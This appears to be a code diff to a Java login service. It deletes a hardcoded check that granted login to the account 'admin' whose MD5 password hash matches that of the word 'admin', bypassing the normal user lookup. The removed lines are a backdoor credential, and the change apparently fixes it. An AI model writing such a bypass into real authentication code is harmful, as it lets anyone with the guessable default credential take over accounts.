@@ -47,10 +47,6 @@ public class LoginServiceImpl implements LoginService {
             response.setRetCode(ApiResponseCode.CHECKCODE_ERROR);
             return response;
         }
-        if ("admin".equalsIgnoreCase(accountId) && "21232f297a57a5a743894a0e4a801fc3".equalsIgnoreCase(md5password)) {
-            response.addBody("canLogin", true);
-            return response;
-        }
         User user = this.userDao.getUserByAccount(accountId);
         if (user == null) {
             response.addBody("canLogin", false);
